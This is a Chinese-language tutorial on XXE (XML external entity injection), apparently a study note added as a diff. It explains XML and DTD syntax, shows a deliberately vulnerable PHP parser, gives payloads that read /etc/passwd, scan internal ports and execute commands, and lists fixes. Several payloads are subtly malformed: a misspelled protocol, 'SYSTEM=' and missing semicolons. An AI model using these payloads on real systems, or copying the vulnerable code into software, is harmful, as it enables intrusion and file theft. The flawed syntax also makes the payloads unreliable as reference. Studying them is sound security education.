@@ -1,0 +1,171 @@
+XXE漏洞
+	XXE漏洞全称(XML External Entity Injection)即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害
+	XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件
+	XML(EXtensible Markup Language，可扩展标记语言)用来结构化、存储以及传输信息
+	XML文档结构包括3部分
+		* XML声明
+		* 文档类型定义(可选)
+		* 文档元素
+	-----------------------------------------------
+	<!-- XML声明(定义了XML的版本和编码) -->
+		<?xml version="1.0" encoding="ISO-8859-1"?>
+
+		<!-- 文档类型定义 -->
+		<!DOCTYPE note [
+			<!ELEMENT note (to,from,heading,body)>
+			<!ELEMENT to      (#PCDATA)>
+			<!ELEMENT from    (#PCDATA)>
+			<!ELEMENT heading (#PCDATA)>
+			<!ELEMENT body    (#PCDATA)>
+		]>
+		<!-- 文档元素 -->
+		<note>
+			<to>George</to>
+			<from>John</from>
+			<heading>Reminder</heading>
+			<body>Don't forget the meeting!</body>
+		</note>
+	-----------------------------------------------
+
+	View Code
+		XML声明
+			xml声明以<?开头，以?>结束
+			version属性是必选的，它定义了XML版本
+			encoding属性是可选的，它定义了XML进行解码时所用的字符集
+			-------------------------------------------
+			<?xml version="1.0" encoding="ISO-8859-1"?>
+			-------------------------------------------
+		文档类型定义
+			文档类型定义(Document Type Definition，DTD)用来约束一个XML文档的书写规范
+			文档类型定义的基础语法
+				<!ELEMENT 元素名 类型>
+			内部定义
+				将文档类型定义放在XML文档中，称为内部定义，内部定义的格式如下
+				<!DOCTYPE 根元素 [元素声明]>
+				eg.
+					-------------------------------------------------
+					<!DOCTYPE note [
+						<!-- 定义此文档是note类型 -->
+						<!ELEMENT note (to,from,heading,body)>
+						<!-- 定义note有4个元素:to from heading body -->
+					 	<!ELEMENT to      (#PCDATA)>
+						<!-- 定义to元素为#PCDATA类型  -->
+					 	<!ELEMENT from    (#PCDATA)>
+						<!-- 定义from元素为#PCDATA类型 -->
+					 	<!ELEMENT heading (#PCDATA)> 
+						<!-- 定义heading元素为#PCDATA类型 -->
+					 	<!ELEMENT body    (#PCDATA)>
+						<!-- 定义body元素为#PCDATA类型 -->
+					]>
+					-------------------------------------------------
+
+		外部文档引用
+			文档类型定义的内容也可以保存为单独的DTD文档
+			DTD文档在本地格式
+				--------------------------------------------
+				<!DOCTYPE 根元素 SYSTEM "文件名">
+				<!--eg：<!DOCTYPE note SYSTEM "note.dtd">-->
+				--------------------------------------------
+			DTD文档外网引用
+				--------------------------------------------------------------------
+				<!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文档的URL">
+				<!--eg：<!doctype html public "xxx" "http://www.xx.com/note.dtd">-->
+				--------------------------------------------------------------------
+
+	漏洞代码
+		file_get_contents函数读取了php://input传入的数据，但是传入的数据没有经过任何过滤，直接在loadXML函数中进行了调用并通过了echo函数输入$username的结果，这样就导致了XXE漏洞的产生
+		------------------------------------------------------
+		<?php 
+		libxml_disable_entity_loader(false);
+		$xmlfile=file_get_contents('php://input');
+		$dom=new DOMDocument();
+		
+		$dom->loadXML($xmlfile,LIBXML_NOENT | LIBXML_DTDLOAD);
+		$creds=simplexml_import_dom($dom);
+		$username=$creds->username;
+		$password=$creds->password;
+		echo 'hello'.$username;
+		?>
+		------------------------------------------------------
+
+	文件读取
+		通过加载外部实体，利用file://、php://等伪协议读取本地文件
+		payload
+			-------------------------------------------
+			<?xml version="1.0" encoding="ISO-8859-1"?>
+			<!DOCTYPE creds[
+			<!ELEMENT userename ANY>
+			<!ELEMENT password ANY>
+			<!ENTITY xxe SYSTEM="file:///etc/passwd"]>
+			<creds>
+			    <username>&xxe</username>
+			    <password>test</password>
+			</creds>
+			-------------------------------------------
+
+	内网探测
+		利用xxe漏洞进行内网探测，如果端口开启，请求返回的时间会很快，如果端口关闭请求返回的时间会很慢
+		探测22号端口是否开启
+		payload
+			-------------------------------------------
+			<?xml version="1.0"?>
+			<!DOCTYPE creds[
+			<!ELEMENT userename ANY>
+			<!ELEMENT password ANY>
+			<!ENTITY xxe SYSTEM="http://127.0.0.1.22"]>
+			<creds>
+			    <username>&xxe</username>
+			    <password>test</password>
+			</creds>
+			-------------------------------------------
+
+	内网应用攻击
+		通过XXE漏洞进行内网应用攻击，例如攻击内网jmx控制台未授权访问的JBpss漏洞进行攻击
+
+	命令执行
+		利用xxe漏洞可以调用except://伪协议调用系统命令
+		payload
+			-----------------------------------
+			<?xml version="1.0"?>
+			<!DOCTYPE creds[
+			<!ELEMENT userename ANY>
+			<!ELEMENT password ANY>
+			<!ENTITY xxe SYSTEM="except://id"]>
+			<creds>
+			    <username>&xxe</username>
+			    <password>test</password>
+			</creds>
+			-----------------------------------
+
+	漏洞修补
+		禁用外部实体
+			在代码中设置libxml_disable_entity_loader(true)
+		过滤用户提交的XML数据
+			过滤关键词为<!DOCTYPE、<!ENTITY、SYSTEM和PUBLIC
+
+	简介
+		XML外部实体注入(XML External Entity)简称XXE漏洞
+		简介
+			* XML指可扩展标记语言(EXtensible Markup Language)
+			* XML是一种很像HTML的标记语言
+			* XML的设计宗旨是传输数据，而不是显示数据
+			* XML标签没有被预定义，您需要自行定义标签
+			* XML被设计为具有自我描述性
+			* XML是W3C的推荐标准
+		XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素
+		DTD全称为，Document Type Definition，中文翻译为文档类型定义，是一套为了进行程序间的数据交换而建立的关于标记符的语法规则
+		文档类型定义(DTD)可定义合法的XML文档构建模块
+		它使用一系列合法的元素来定义文档的结构
+		DTD可被成行地声明于XML文档中，也可作为一个外部引用
+		内部的DOCTYPE声明
+			<!DOCTYPE root-element [element-declarations]>
+		外部文档声明
+			<!DOCTYPE root-element SYSTEM "filename">
+		在DTD中进行实体声明的时候，将使用ENTITY关键字来声明
+		实体是用于定义引用普通文本或特殊字符的快捷方式的变量
+		实体可在内部或外部进行声明
+		内部实体声明
+			<!ENTITY entity-name "entity-value">
+		外部实体声明
+			<!ENTITY entity-name SYSTEM "URI/URL">
+		XXE漏洞代码分析
